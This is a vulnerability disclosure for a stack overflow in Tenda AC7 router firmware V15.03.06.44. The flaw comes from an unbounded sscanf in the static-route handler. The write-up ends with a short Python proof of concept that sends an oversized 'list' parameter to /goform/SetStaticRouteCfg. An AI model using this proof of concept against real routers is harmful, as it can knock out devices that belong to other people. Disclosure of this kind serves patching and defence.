## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

The Tenda  AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `list` variable receives the `list` parameter from a POST request and is later assigned to function `save_staticroute_data`. 

![image-20240318155715410](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155715410.png)

In the `save_staticroute_data` function, the `buf` (the value of `list`) is passed to `p` and formatted by the `sscanf` function and in the form of `%[^,],%[^,],%[^,],%s`. This greedy matching mechanism is not secure, as long as the size of the data we enter is larger than the size of `dst_net, net_mask, net_gw, net_ifname`, it will cause a stack overflow.

![image-20240318155846660](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155846660.png)

![image-20240318155758609](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155758609.png)

The user-provided `list` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetStaticRouteCfg"
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,aa"

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318155907718](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155907718.png)